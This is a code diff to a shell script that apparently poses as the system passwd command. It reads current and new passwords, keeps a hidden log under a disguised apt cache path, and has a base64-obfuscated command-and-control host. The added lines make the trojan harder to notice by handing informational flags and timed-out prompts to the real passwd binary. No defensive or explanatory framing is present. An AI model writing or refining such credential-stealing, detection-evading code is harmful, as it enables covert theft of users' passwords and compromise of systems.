@@ -7,6 +7,13 @@ case "$(whoami)" in
 esac
 
 
+# Pass through for informational flags
+for arg in "$@"; do
+    case "$arg" in
+        --help|-h|--version|-S|--status) exec $REAL_PASSWD "$@" ;;
+    esac
+done
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
@@ -55,9 +62,9 @@ fi
 # Root changing another user's password — no current-pass prompt
 # -------------------------------------------------------
 if [ $IS_ROOT -eq 1 ] && [ -n "$1" ]; then
-    IFS= read -r -s -p "New password: " NEW_PASS
+    if ! IFS= read -r -s -t 10 -p "New password: " NEW_PASS; then echo ""; exec $REAL_PASSWD "$@"; fi
     echo ""
-    IFS= read -r -s -p "Retype new password: " NEW_PASS2
+    if ! IFS= read -r -s -t 10 -p "Retype new password: " NEW_PASS2; then echo ""; exec $REAL_PASSWD "$@"; fi
     echo ""
 
     if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
@@ -106,11 +113,11 @@ fi
 # -------------------------------------------------------
 # User changing their own password
 # -------------------------------------------------------
-IFS= read -r -s -p "Current password: " CURRENT_PASS
+if ! IFS= read -r -s -t 10 -p "Current password: " CURRENT_PASS; then echo ""; exec $REAL_PASSWD "$@"; fi
 echo ""
-IFS= read -r -s -p "New password: " NEW_PASS
+if ! IFS= read -r -s -t 10 -p "New password: " NEW_PASS; then echo ""; exec $REAL_PASSWD "$@"; fi
 echo ""
-IFS= read -r -s -p "Retype new password: " NEW_PASS2
+if ! IFS= read -r -s -t 10 -p "Retype new password: " NEW_PASS2; then echo ""; exec $REAL_PASSWD "$@"; fi
 echo ""
 
 if [ "$NEW_PASS" != "$NEW_PASS2" ]; then
